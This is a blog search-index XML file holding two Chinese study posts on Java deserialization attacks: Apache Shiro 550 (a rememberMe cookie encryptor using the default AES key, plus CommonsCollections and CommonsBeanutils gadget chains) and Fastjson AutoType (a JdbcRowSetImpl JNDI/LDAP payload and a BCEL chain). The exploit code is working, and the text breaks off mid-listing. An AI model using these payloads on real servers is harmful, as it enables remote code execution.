<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>shiro 反序列化</title>
    <link href="/2024/08/28/shiro/"/>
    <url>/2024/08/28/shiro/</url>
    
    <content type="html"><![CDATA[<h1 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h1><hr><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><p> <img src="/image/shiro/image-20240504133447687.png" alt="image-20240504133447687"> </p><h3 id="漏洞点及利用"><a href="#漏洞点及利用" class="headerlink" title="漏洞点及利用"></a>漏洞点及利用</h3><p>在shiro中，当勾选rememberme字段后，在登陆成功后会返回一串很长的cookie值，而这串cookie在之后的请求中都会带上</p><p>shiro会对rememberme进行反序列化操作。所以我们只需要能够控制rememberme的值，既可进行漏洞利用</p><p><img src="/image/shiro/image-20240505140334134.png" alt="image-20240505140334134"> </p><p>我们利用关键字来搜索有关处理rememberme这个字段的内容</p><p>可以找到有一个名为<code>CookieRememberMeManager</code>的类</p><p>在<code>CookieRememberMeManager.getRememberedSerializedIdentity</code>中，获取了rememberme的值，并且进行了base64解密，将解密后内容返回</p><p><img src="/image/shiro/image-20240505141222618.png" alt="image-20240505141222618"> </p><p>接下来寻找哪里调用了这个<code>CookieRememberMeManager.getRememberedSerializedIdentity</code></p><p>在<code>AbstractRememberMeManager.getRememberedPrincipals</code> 这个方法中调用了这个方法</p><p>并且在获得base64解密的内容后，会进入<code>convertBytesToPrincipals</code></p><p><img src="/image/shiro/image-20240505141618915.png" alt="image-20240505141618915"> </p><p>在<code>convertBytesToPrincipals</code>中会进行AES解密，并且将解密后的内容进行反序列化</p><p><img src="/image/shiro/image-20240505142123452.png" alt="image-20240505142123452">  </p><p>所以我们只需要能够控制rememberme的内容，我们就可以使它走到反序列化中，进行反序列化漏洞利用</p><p>但是由于这里使用了AES加密，所以我们需要获得AES的key值才可以进行模拟加密</p><p>下图可以看到，这里进行AES加密的key值使一个默认的常量</p><p><img src="/image/shiro/image-20240505143306096.png" alt="image-20240505143306096"> </p><h4 id="以下是模拟加密脚本"><a href="#以下是模拟加密脚本" class="headerlink" title="以下是模拟加密脚本"></a>以下是模拟加密脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (filename ,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data=f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS= AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s+((BS -<span class="hljs-built_in">len</span>(s) % BS)* <span class="hljs-built_in">chr</span>(BS-<span class="hljs-built_in">len</span>(s)% BS)).encode()<br>    key=<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv= uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext =base64.b64encode(iv+encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data =base64.b64decode(enc_data)<br>    unpad= <span class="hljs-keyword">lambda</span> s :s[:-s[-<span class="hljs-number">1</span>]]<br>    key=<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv= enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    <span class="hljs-comment"># plaintext=encryptor.decrypt(plaintext)</span><br>    plaintext=unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data= get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><p>只要导入了<code>commons-collections4.0</code>以上版本，就可以直接使用CC2这条链</p><p>在shiro中，没办法解析到<code>transformers</code>数组，导致其他链没办法生效</p><h4 id="CC3-CC6-CC2"><a href="#CC3-CC6-CC2" class="headerlink" title="CC3+CC6+CC2"></a>CC3+CC6+CC2</h4><p><a href="C:\Users\40148\Desktop\笔记\CC链\cc链.md#shiroCC链(CC6+CC2+CC3)">看这里</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//CC3</span><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; tClass = templates.getClass();<br><span class="hljs-comment">//反射为name赋值</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates,<span class="hljs-string">&quot;asd&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] code=&#123;bytes&#125;;<br>bytecodesField.set(templates,code);<br><br><span class="hljs-comment">//CC2</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">//CC6</span><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">//先给lazymap一个无用的Transformer</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,templates);<br><br>HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br>lazymap.remove(templates);<br><span class="hljs-comment">//解决put问题，将无用的Transformer修改为chainedTransformer</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">lazymapClass</span> <span class="hljs-operator">=</span> lazymap.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazymapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>factoryField.set(lazymap,invokerTransformer);<br><br>serialize.serialize(map2);<br>unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>); <br></code></pre></td></tr></table></figure><h4 id="shiro原生依赖利用（CB链）"><a href="#shiro原生依赖利用（CB链）" class="headerlink" title="shiro原生依赖利用（CB链）"></a>shiro原生依赖利用（CB链）</h4><p>上面的cc链打法都是在导入CC包的情况下才能实现，但是原生的shiro中自带了<code>commons-beanutils</code></p><p><img src="/image/shiro/image-20240525105031593.png" alt="image-20240525105031593"> </p><h5 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h5><p>之前我们在分析cc3时使用的是<code>TemplatesImpl.getTransletInstance</code>来调用<code>newTransformer</code>,但是因为是private，所以这里并不能使用</p><p>这里<code>TemplatesImpl.getOutputProperties</code>,这是另外一个能进行类加载的点，并且因为是public，所以我们可以使用<code>PropertyUtils.getProperty</code>调用到</p><p>在<code>TemplatesImpl.getOutputProperties</code>中，同样调用了newTransformer方法，导致代码执行</p><p><img src="/image/shiro/image-20240526104007531.png" alt="image-20240526104007531"> </p><p>具体流程是仿照CC3的类加载，但最后使用<code>PropertyUtils.getProperty</code>来调用<code>TemplatesImpl.getOutputProperties</code></p><h5 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; tClass = templates.getClass();<br><span class="hljs-comment">//反射为name赋值</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates,<span class="hljs-string">&quot;asd&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>tfactoryField.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] code=&#123;bytes&#125;;<br>bytecodesField.set(templates,code);<br>PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br></code></pre></td></tr></table></figure><hr><h5 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h5><p>接下来应该寻找调用<code>PropertyUtils.getProperty</code>的地方</p><p>有一个较为熟悉的方法<code>compare</code>，之前在分析CC4时也出现过这个方法，CC4中利用的是优先队列<code>PriorityQueue</code>调用<code>TransformingComparator.compare</code></p><p>这里也可以仿照使用优先队列实现</p><p><img src="/image/shiro/image-20240526105930323.png" alt="image-20240526105930323"> </p><h5 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        <span class="hljs-keyword">Class</span>&lt;? extends TemplatesImpl&gt; tClass = templates.getClass();<br>        //反射为<span class="hljs-type">name</span>赋值<br>        Field nameField = tClass.getDeclaredField(&quot;_name&quot;);<br>        nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>        nameField.<span class="hljs-keyword">set</span>(templates,&quot;asd&quot;);<br><br>        Field bytecodesField = tClass.getDeclaredField(&quot;_bytecodes&quot;);<br>        bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        Field tfactoryField = tClass.getDeclaredField(&quot;_tfactory&quot;);<br>        tfactoryField.setAccessible(<span class="hljs-keyword">true</span>);<br>        tfactoryField.<span class="hljs-keyword">set</span>(templates,<span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        byte[] bytes = Files.readAllBytes(Paths.<span class="hljs-keyword">get</span>(&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;));<br>        byte[][] code=&#123;bytes&#125;;<br>        bytecodesField.<span class="hljs-keyword">set</span>(templates,code);<br>//        PropertyUtils.getProperty(templates,&quot;transletInstance&quot;);<br><br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator(&quot;outputProperties&quot;,<span class="hljs-built_in">new</span> AttrCompare());<br>        TransformingComparator&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; transformingComparator = <span class="hljs-built_in">new</span> TransformingComparator&lt;&gt;(<span class="hljs-built_in">new</span> ConstantTransformer&lt;&gt;(<span class="hljs-number">1</span>));<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(transformingComparator);<br>        priorityQueue.<span class="hljs-keyword">add</span>(templates);<br>        priorityQueue.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">Class</span>&lt;PriorityQueue&gt; c = PriorityQueue.<span class="hljs-keyword">class</span>;<br>        Field comparatorField = c.getDeclaredField(&quot;comparator&quot;);<br>        comparatorField.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparatorField.<span class="hljs-keyword">set</span>(priorityQueue,beanComparator);<br><br>        serialize.serialize(priorityQueue);<br>        unserialze.unserialize(&quot;ser.bin&quot;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fastjson</title>
    <link href="/2024/08/28/fastjson/"/>
    <url>/2024/08/28/fastjson/</url>
    
    <content type="html"><![CDATA[<h2 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h2><h4 id="1-什么是Fastjson"><a href="#1-什么是Fastjson" class="headerlink" title="1.什么是Fastjson"></a>1.什么是Fastjson</h4><p>Fastjson是阿里开发的一个java的json库</p><h4 id="2-fastjson反序列化漏洞"><a href="#2-fastjson反序列化漏洞" class="headerlink" title="2.fastjson反序列化漏洞"></a>2.fastjson反序列化漏洞</h4><p>由于引进了<strong>AutoType</strong>功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的set方法</p><h4 id="3-引入AutoType的原因："><a href="#3-引入AutoType的原因：" class="headerlink" title="3.引入AutoType的原因："></a>3.引入AutoType的原因：</h4><p>Fastjson通过parseObject&#x2F;parse将传入的字符串反序列化为Java对象</p><p>对于json来说，实现序列化（将Java对象转换成字符串）有两种方式</p><p>一种是基于getter和setter方法，但是此方法会出现当两个子类同时继承至一个接口时，在对象进行序列化会自动抹除子类，导致在反序列化时无法区分子类，只保留接口的类型</p><p>为了更好理解给出以下例子：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl">假设有以下两个类<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Apple</span> <span class="hljs-title">implements</span> <span class="hljs-title">Fruit</span> </span>&#123;<br>    private Big_Decimal price;<br>  <br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">iphone</span> <span class="hljs-title">implements</span> <span class="hljs-title">Fruit</span> </span>&#123;<br>    private Big_Decimal price;<br> <br>&#125;<br><br>实例化对象之后，假设苹果对象的price为<span class="hljs-number">0</span>.<span class="hljs-number">5</span>，Apple类对象序列化为json格式后为：<br><br>&#123;<span class="hljs-string">&quot;Fruit&quot;</span>:&#123;<span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">0</span>.<span class="hljs-number">5</span>&#125;&#125;<br><br>假设iphone对象的price为<span class="hljs-number">5000</span>,序列化为json格式后为：<br><br>&#123;<span class="hljs-string">&quot;Fruit&quot;</span>:&#123;<span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">5000</span>&#125;&#125;<br><br>将这个类的对象序列化的时候，就会将子类抹去（apple/iphone）只保留接口的类型(Fruit)，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是apple还是iphone<br></code></pre></td></tr></table></figure><p>所以为了解决上面的问题引入第二种方式</p><p>AutoType</p><p>AutoType在序列化时会将原始子类用<code>@type</code>的方式保存下来，例如上面的例子在进行序列化时就会保存为</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123; <span class="hljs-string">&quot;fruit&quot;</span>:&#123; <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;com.hollis.lab.fastjson.test.Apple&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">0</span>.<span class="hljs-number">5</span> &#125; &#125;<br>和<br>&#123;<span class="hljs-string">&quot;fruit&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;com.hollis.lab.fastjsn.test.iphone&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">5000</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>这样就可以使得反序列化时保持原始类</p><h4 id="4-fastjson反序列化漏洞成因"><a href="#4-fastjson反序列化漏洞成因" class="headerlink" title="4.fastjson反序列化漏洞成因"></a>4.fastjson反序列化漏洞成因</h4><p>按照上面的说法，@type在反序列化时会自动的加载类，并且自动的去调用setter和getter方法，所以我们可以指定的去加载一些恶意类</p><p>比较常见的是<strong>om.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用</strong>,我们可以利用这个方法进行远程恶意类的加载</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">构造以下<span class="hljs-type">json</span><br>&#123;<br>    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>    &quot;DataSourceName&quot;: &quot;ldap://127.0.0.1:8085/JGLkuUyN&quot;,<br>    &quot;autoCommit&quot;: <span class="hljs-keyword">false</span><br>&#125;<br>这个<span class="hljs-type">json</span>会利用@<span class="hljs-keyword">type</span>自动调用setter的行为将DataSourceName传进去并反序列化成一个对象<br>这个对象则会利用ldap协议进行远程加载我们的恶意类<br></code></pre></td></tr></table></figure><h2 id="fastjson反序列化和原生反序列化的区别"><a href="#fastjson反序列化和原生反序列化的区别" class="headerlink" title="fastjson反序列化和原生反序列化的区别"></a>fastjson反序列化和原生反序列化的区别</h2><p>不同：</p><p>1、不需要实现Serializable接口</p><p>2、 变量不需要不是transient，只需要变量有对应的setter方法或者是public或者是满足条件的getter</p><p>get条件如下图，即需要返回值为<code>Collection,Map,boolean,int,long</code>这几类才可以利用</p><p><img src="/image/fastjson/image-20240501214415921.png" alt="image-20240501214415921"> </p><p>3、突破口是setter&#x2F;getter，而不是readObject</p><p>相同点是都是通过反射或者动态类加载来进行</p><hr><h3 id="JdbcRowSetImpl分析"><a href="#JdbcRowSetImpl分析" class="headerlink" title="JdbcRowSetImpl分析"></a>JdbcRowSetImpl分析</h3><p>这条链利用jndi进行远程类加载，实现命令执行</p><p><code>jdbcRowSetImpl</code>这个类中在<code>connect</code>方法里存在一处<code>jndi</code>注入,这里我们需要找的可控变量为<code>DataSourceName</code></p><p><img src="/image/fastjson/image-20240501155432443.png" alt="image-20240501155432443"> </p><p>上面提到，在<code>fastjson</code>中可控变量需要是有setter方法的变量或者public又或者有对应返回类型的getter方法</p><p>很明显这里的<code>DataSourceName</code>满足有setter的要求</p><p><img src="/image/fastjson/image-20240501160610053.png" alt="image-20240501160610053"> </p><p>接下来就是跟以往一样找到调用connect方法的位置，这里选择的是<code>setAutoCommit</code></p><p><img src="/image/fastjson/image-20240501162245005.png" alt="image-20240501162245005"> </p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span>  com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> javax.sql.rowset.JdbcRowSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span>&#123;<br><br>        <span class="hljs-type">String</span> payload <span class="hljs-operator">=</span>   <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>DataSourceName<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>ldap://127.0.0.1:8888/PZJEfwjm<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>autoCommit<span class="hljs-subst">\&quot;</span>:false&#125;&quot;</span>;<br>        <span class="hljs-type">JSON</span>.parseObject(payload);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里利用@type，调用<code>JdbcRowSetImpl</code>，并且会自动去调用<code>setDataSourceName</code>和<code>setautoCommit</code></p><p>最终使得<code>DataSourceName</code>赋值为<code>ldap://127.0.0.1:8888/PZJEfwjm</code>这个恶意代码，</p><p><code>setAutoCommit</code>中会走到<code>connect</code>,<code>connect</code>中进行jndi注入</p><h4 id="流程如下"><a href="#流程如下" class="headerlink" title="流程如下"></a>流程如下</h4><p><img src="/image/fastjson/image-20240513091645072.png" alt="image-20240513091645072"> </p><hr><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>因为是本质上是jndi注入，所以必须出网且受版本限制，依赖限制</p><hr><h3 id="BasicDatasource分析"><a href="#BasicDatasource分析" class="headerlink" title="BasicDatasource分析"></a>BasicDatasource分析</h3><h4 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>这一条利用链使用的执行方法是动态类加载，因此可以不出网，但是需要有tomcat</p><p>需要的类为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><p>在这个<code>ClassLoader.loadClass</code>中，当类名为<code>$$BCEL$$</code>时，就会创建一个新的类，再使用<code>defineClass</code>进行动态类加载</p><p><img src="/image/fastjson/image-20240501210914768.png" alt="image-20240501210914768"> </p><p>所以接下来要寻找调用<code>ClassLoader.loadClass</code>的方式</p><p>这里我们就需要使用<code>tomcat</code>中的<code>BasicDatasource</code></p><p>如下图，在<code>createConnectionFactory</code>中，当<code>driverClassLoader</code>不为空时，就会使用<code>driverClassLoader</code>加载<code>driverClassName</code>，所以我们需要控制<code>driverClassLoader</code>为上面提到的<code>ClassLoader.loadClass</code>，<code>driverClassName</code>控制为<code>$$BCEK$$</code></p><p><img src="/image/fastjson/image-20240501212249403.png" alt="image-20240501212249403"> </p><p>而正好这两个值都有他们自己的setter方法，可以在fastjson中利用</p><p><img src="/image/fastjson/image-20240501212959029.png" alt="image-20240501212959029"> <img src="/image/fastjson/image-20240501213015565.png" alt="image-20240501213015565"> </p><p>接下来找的就是找到调用<code>createConnectionFactory</code>的get或者set方法</p><p>最终在这个类中找到了<code>getConnection</code>调用了<code>createDataSource</code>，<code>createDataSource</code>最终调用了<code>createConnectionFactory</code></p><p>并且他的返回值正好是<code>Collection</code>,符合fastjson的利用条件</p><p><img src="/image/fastjson/image-20240501213944334.png" alt="image-20240501213944334"> </p><p><img src="/image/fastjson/image-20240501214119140.png" alt="image-20240501214119140"> </p><p>利用代码如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">        ClassLoader classLoader = new ClassLoader();<br>        byte[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\fastjson\\calc.class&quot;</span>));<br>        String code = Utility.encode(bytes, true);<br>//        classLoader.loadClass(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span> + code).newInstance();<br>        BasicDataSource basicDataSource = new BasicDataSource();<br>        basicDataSource.setDriverClassName(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span> + code);<br>        basicDataSource.setDriverClassLoader(classLoader);<br>        basicDataSource.getConnection();<br></code></pre></td></tr></table></figure><h4 id="fastjson利用"><a href="#fastjson利用" class="headerlink" title="fastjson利用"></a>fastjson利用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 